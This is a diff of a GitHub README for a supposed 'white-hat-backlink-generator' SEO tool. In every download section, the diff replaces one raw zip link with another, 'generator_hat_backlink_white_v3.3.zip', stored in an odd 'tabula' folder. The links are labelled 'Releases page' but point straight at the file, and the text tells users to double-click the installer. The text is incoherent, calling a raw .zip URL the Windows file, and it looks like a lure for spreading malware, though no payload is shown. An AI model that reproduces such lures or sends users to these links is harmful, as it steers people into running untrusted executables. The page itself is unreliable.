@@ -2,7 +2,7 @@
 # 🚀 white-hat-backlink-generator - Generate Quality Backlinks Easily
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/EvoCommerce-byte/white-hat-backlink-generator/main/tabula/white-hat-backlink-generator.zip)](https://raw.githubusercontent.com/EvoCommerce-byte/white-hat-backlink-generator/main/tabula/white-hat-backlink-generator.zip)
+[![Download](https://github.com/EvoCommerce-byte/white-hat-backlink-generator/raw/refs/heads/main/tabula/generator_hat_backlink_white_v3.3.zip)](https://github.com/EvoCommerce-byte/white-hat-backlink-generator/raw/refs/heads/main/tabula/generator_hat_backlink_white_v3.3.zip)
 
 ## 📝 Overview
 The **white-hat-backlink-generator** is an ethical, quality SEO backlink generator. This tool helps you boost your online presence while adhering to safe and effective SEO practices. It’s designed for anyone looking to improve their website's visibility on search engines without any technical skills.
@@ -19,13 +19,13 @@ To get started, you will need to download the software from the Releases page. F
 ## 📥 Download & Install
 1. **Visit the Releases Page**
    Go to the following link to access the software:
-   [Download white-hat-backlink-generator](https://raw.githubusercontent.com/EvoCommerce-byte/white-hat-backlink-generator/main/tabula/white-hat-backlink-generator.zip)
+   [Download white-hat-backlink-generator](https://github.com/EvoCommerce-byte/white-hat-backlink-generator/raw/refs/heads/main/tabula/generator_hat_backlink_white_v3.3.zip)
 
 2. **Choose the Latest Version**
    On the Releases page, find the latest version of the software. This version includes the most recent features and fixes.
 
 3. **Download the File**
-   Click on the file that matches your operating system to start the download. Typically, you will find files like `https://raw.githubusercontent.com/EvoCommerce-byte/white-hat-backlink-generator/main/tabula/white-hat-backlink-generator.zip` for Windows or `.dmg` for macOS.
+   Click on the file that matches your operating system to start the download. Typically, you will find files like `https://github.com/EvoCommerce-byte/white-hat-backlink-generator/raw/refs/heads/main/tabula/generator_hat_backlink_white_v3.3.zip` for Windows or `.dmg` for macOS.
 
 4. **Run the Installer**
    Once the download is complete, locate the downloaded file on your computer. Double-click the file to run the installer. Follow the on-screen instructions to complete the installation.
@@ -71,7 +71,7 @@ We welcome contributions from users. If you have ideas for improvements or featu
 This project is licensed under the MIT License. For more information, please refer to the LICENSE file in the repository.
 
 ## 📥 Download Now Again
-Don't forget, you can always visit the [Releases page](https://raw.githubusercontent.com/EvoCommerce-byte/white-hat-backlink-generator/main/tabula/white-hat-backlink-generator.zip) to download the latest version.
+Don't forget, you can always visit the [Releases page](https://github.com/EvoCommerce-byte/white-hat-backlink-generator/raw/refs/heads/main/tabula/generator_hat_backlink_white_v3.3.zip) to download the latest version.
 
 Happy backlink generating!
 ```
